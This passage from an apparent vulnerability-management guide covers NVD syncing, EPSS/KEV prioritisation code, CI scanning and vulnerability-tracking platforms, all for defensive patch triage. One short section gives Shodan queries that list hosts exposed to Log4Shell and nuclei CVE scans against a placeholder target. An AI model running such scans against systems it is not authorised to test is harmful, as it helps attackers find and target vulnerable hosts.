            self.headers = {"apiKey": api_key} if api_key else {}
            self.delay = 0.6 if api_key else 6.0
            self.db = sqlite3.connect(db_path)
            self.db.execute(
                "CREATE TABLE IF NOT EXISTS cves "
                "(id TEXT PRIMARY KEY, data JSON, score REAL, severity TEXT, "
                "published TEXT, modified TEXT)"
            )

        def _req(self, params):
            time.sleep(self.delay)
            return requests.get(self.BASE, params=params,
                                headers=self.headers, timeout=30).json()

        def sync(self, hours=24):
            end = datetime.utcnow()
            start = end - timedelta(hours=hours)
            params = {
                "lastModStartDate": start.strftime("%Y-%m-%dT%H:%M:%S.000"),
                "lastModEndDate":   end.strftime("%Y-%m-%dT%H:%M:%S.000"),
                "resultsPerPage": 2000
            }
            count = 0
            while True:
                params["startIndex"] = count
                data = self._req(params)
                for item in data.get("vulnerabilities", []):
                    cve = item["cve"]
                    v31 = cve.get("metrics", {}).get("cvssMetricV31", [{}])[0].get("cvssData", {})
                    self.db.execute(
                        "INSERT OR REPLACE INTO cves VALUES (?,?,?,?,?,?)",
                        (cve["id"], json.dumps(cve), v31.get("baseScore"),
                         v31.get("baseSeverity"), cve.get("published"), cve.get("lastModified"))
                    )
                    count += 1
                self.db.commit()
                if count >= data.get("totalResults", 0):
                    break
            return count

        def critical_cves(self):
            return self.db.execute(
                "SELECT id, score FROM cves WHERE severity='CRITICAL' ORDER BY score DESC"
            ).fetchall()

### EPSS + KEV Combined Pipeline

    import requests

    def enrich_cves(cve_ids: list) -> list:
        enriched = {cid: {"cve_id": cid, "epss": 0.0, "pct": 0.0,
                          "in_kev": False, "kev_due": ""} for cid in cve_ids}

        # EPSS
        for i in range(0, len(cve_ids), 100):
            batch = ",".join(cve_ids[i:i+100])
            r = requests.get(f"https://api.first.org/data/v1/epss?cve={batch}")
            for e in r.json().get("data", []):
                if e["cve"] in enriched:
                    enriched[e["cve"]]["epss"] = float(e["epss"])
                    enriched[e["cve"]]["pct"] = float(e["percentile"])

        # KEV
        kev = requests.get(
            "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
        ).json()
        for v in kev["vulnerabilities"]:
            if v["cveID"] in enriched:
                enriched[v["cveID"]]["in_kev"] = True
                enriched[v["cveID"]]["kev_due"] = v.get("dueDate", "")
                enriched[v["cveID"]]["ransomware"] = v.get("knownRansomwareUse") == "Known"

        def tier(e):
            if e["in_kev"] or e["epss"] > 0.70: return "T1-Emergency"
            if e["epss"] > 0.10: return "T2-Critical"
            if e["epss"] > 0.01: return "T3-High"
            return "T4-Normal"

        result = list(enriched.values())
        result.sort(key=lambda x: (x["in_kev"], x["epss"]), reverse=True)
        for e in result:
            e["tier"] = tier(e)
        return result

### Vulnerability Intelligence Pipeline Architecture

    [NVD API] [EPSS API] [KEV Feed] [OSV] [Vendor RSS]
         |         |          |       |         |
         +---------+----------+-------+---------+
                              |
               [Normalization Layer (CVE as key)]
                              |
               [Enrichment DB: CVSS+EPSS+KEV+ExploitDB+ADP]
                              |
               [Prioritization Engine (tier assignment)]
                              |
          +------------------+-------------------+
          |                  |                   |
    [SIEM/SOAR]      [Ticket System]      [Dashboard/API]

### Open Source VM Platforms

**DefectDojo** (github.com/DefectDojo/django-DefectDojo):

    # Import scanner results (100+ formats supported)
    curl -X POST https://defectdojo.example.com/api/v2/import-scan/       -H "Authorization: Token $TOKEN"       -F "scan_type=Trivy Scan" -F "file=@trivy.json"       -F "product_name=My App" -F "engagement_name=Sprint-42"

**Dependency-Track** (github.com/DependencyTrack/dependency-track):

    # Upload SBOM for continuous tracking
    curl -X PUT https://dtrack.example.com/api/v1/bom       -H "X-Api-Key: $DT_KEY"       -F "projectName=My App" -F "projectVersion=2.1.0"       -F "autoCreate=true" -F "bom=@sbom.cdx.json"

### CI/CD Security Scanning

    # GitHub Actions -- vulnerability gate
    - name: Trivy scan
      uses: aquasecurity/trivy-action@master
      with:
        image-ref: myapp:${{ github.sha }}
        format: sarif
        output: trivy-results.sarif
        severity: CRITICAL,HIGH
        exit-code: '1'
        ignore-unfixed: true

    - name: Upload to GitHub Security tab
      uses: github/codeql-action/upload-sarif@v3
      if: always()
      with:
        sarif_file: trivy-results.sarif

### Threat Intelligence Tools

**Shodan CVE search:**

    shodan count "vuln:CVE-2021-44228"
    shodan search "vuln:CVE-2021-44228" --fields ip_str,port,org,country_code

**Nuclei CVE templates:**

    nuclei -t cves/ -u https://target.com -severity critical,high -o results.json
    nuclei -t cves/2021/CVE-2021-44228.yaml -u https://target.com
    nuclei -update-templates

### CISA ADP Enrichment

CISA-ADP publishes machine-readable enrichment in CVE JSON 5.0 `containers.adp` array,
often 24-72 hours before NVD updates. Key signals:

    "adp": [{
      "providerMetadata": {"shortName": "CISA-ADP"},
      "metrics": [{"other": {"type": "ssvc", "content": {
        "options": [
          {"Exploitation": "active"},   // none | poc | active
          {"Automatable": "yes"},       // yes | no (wormability)
          {"Technical Impact": "total"} // partial | total
        ]
      }}}]
    }]

`Exploitation: active` in CISA-ADP data is an early warning signal equivalent to
KEV membership -- often appears before formal KEV catalog addition.

---

*Last updated: 2026-05-07 | Covers CVE program architecture, CVSS v3.1/v4.0,
EPSS, CISA KEV, vulnerability databases, research methodology, patch management,
notable case studies, and automation tooling.*
